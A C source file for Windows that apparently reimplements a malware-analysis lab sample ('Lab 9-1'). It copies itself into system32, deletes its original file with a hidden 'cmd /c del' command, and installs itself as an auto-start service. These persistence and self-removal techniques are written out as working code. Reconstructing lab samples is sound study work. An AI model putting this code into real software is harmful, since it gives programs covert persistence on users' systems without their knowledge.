#include<stdio.h>
#include<string.h>
#include<Windows.h>
#include<Shellapi.h>

//check the command line argument
void WINAPI Lab0901Main(DWORD a, LPTSTR *b);
int main(int argc, char *argv[]){

	if (argc <= 1)
	{
		HKEY hkey;
		char filepath[] = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\XPS";
		//open the registrykey at 

		char pathName[1000];
		char sysdir[100];
		char prefix[8] = "/c del ";
		char sufix[8] = ">>NUL";


		LONG i = RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\XPS"), 0, KEY_ALL_ACCESS, &hkey);
		/*int n = RegSetValueEx(hkey, TEXT("C:\\Temp\\cc.exe"), 0, REG_SZ, (BYTE *)filepath, strlen(filepath));*/
		if (i != ERROR_SUCCESS){
			//printf("Cant find the key");
			// get the file name and build the string
			GetModuleFileNameA(0, pathName, 0x3E8);
			//printf("File path: %s\n", pathName);
			//copy the file cmd

			if (CopyFileA(pathName, "C:\\Windows\\system32\\Lab 9-1-patched.exe", FALSE))
			{
				char* deletepath;
				deletepath = malloc(strlen(pathName) + 8 + 8); /* make space for the new string (should check the return value ...) */
				strcpy(deletepath, prefix); /* copy name into the new var */
				strcat(deletepath, pathName); /* add the extension */
				strcat(deletepath, sufix); /* add the extension */
				//printf("delete path %s\n", deletepath);
				//printf(" ");

				if (ShellExecuteA(0, "open", "cmd.exe", deletepath, NULL, 1) > 32)
				{
					//start service
					SERVICE_TABLE_ENTRYA Lab0901;
					Lab0901.lpServiceName = "Lab09-01";
					Lab0901.lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)Lab0901Main;

					StartServiceCtrlDispatcherA(&Lab0901);
					//DWORD dw = GetLastError();
					Lab0901Main(0, NULL);
				}
			}

		}

	}

	return 0;
}

void WINAPI Lab0901Main(DWORD a, LPTSTR *b){
	//for debugging
	//DWORD error;

	char newpath[] = "C:\\Windows\\system32\\Lab 9-1-patched.exe";
	char DisplayName[] = "Lab09-01";
	HANDLE h = OpenSCManagerA(0, 0, 3);
	GetCurrentProcess();
	CreateServiceA(h, DisplayName, DisplayName, 2, 16, 2, 0, newpath, 0, 0, 0, 0, 0);
	Sleep(INFINITE);
	return;
}